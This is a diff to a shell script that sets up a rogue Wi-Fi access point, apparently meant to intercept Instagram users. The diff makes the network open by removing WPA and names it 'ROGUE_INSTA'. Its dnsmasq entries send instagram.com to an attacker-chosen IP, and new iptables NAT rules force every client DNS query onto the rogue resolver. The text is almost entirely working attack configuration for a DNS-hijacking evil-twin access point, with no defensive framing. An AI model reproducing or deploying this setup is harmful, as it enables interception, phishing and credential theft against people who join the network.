@@ -8,8 +8,7 @@ fi
 
 # default env vars
 INTERFACE="wlan0"
-SSID="iPhone de Lucas"
-PASSWORD="password123"
+SSID="ROGUE_INSTA"
 IP_RANGE="192.168.50.1/24"
 INTERNET_IFACE="eth0"
 IP_REDIRECTION=157.240.3.35 # 157.240.3.35 => facebook by default
@@ -58,13 +57,9 @@ echo "redirect to $IP_REDIRECTION..."
 cat > /etc/dnsmasq.conf <<EOF
 interface=$INTERFACE
 dhcp-range=192.168.50.10,192.168.50.100,12h
-# Instagram redirections to redirection IP
+# DNS redirections to redirection IP
 address=/instagram.com/$IP_REDIRECTION
 address=/www.instagram.com/$IP_REDIRECTION
-address=/cdninstagram.com/$IP_REDIRECTION
-address=/i.instagram.com/$IP_REDIRECTION
-address=/graph.instagram.com/$IP_REDIRECTION
-address=/api.instagram.com/$IP_REDIRECTION
 # Force clients to use our DNS
 dhcp-option=6,192.168.50.1
 EOF
@@ -72,6 +67,9 @@ EOF
 # block external DNS requests to force using our DNS server
 iptables -A FORWARD -i $INTERFACE -p udp --dport 53 -j DROP
 iptables -A FORWARD -i $INTERFACE -p tcp --dport 53 -j DROP
+# Add additional DNS blocking rules
+iptables -t nat -A PREROUTING -i $INTERFACE -p udp --dport 53 -j REDIRECT --to-ports 53
+iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 53 -j REDIRECT --to-ports 53
 
 # hostpad conf
 cat > /etc/hostapd/hostapd.conf <<EOF
@@ -84,10 +82,6 @@ wmm_enabled=0
 macaddr_acl=0
 auth_algs=1
 ignore_broadcast_ssid=0
-wpa=2
-wpa_passphrase=$PASSWORD
-wpa_key_mgmt=WPA-PSK
-rsn_pairwise=CCMP
 EOF
 
 systemctl restart dnsmasq
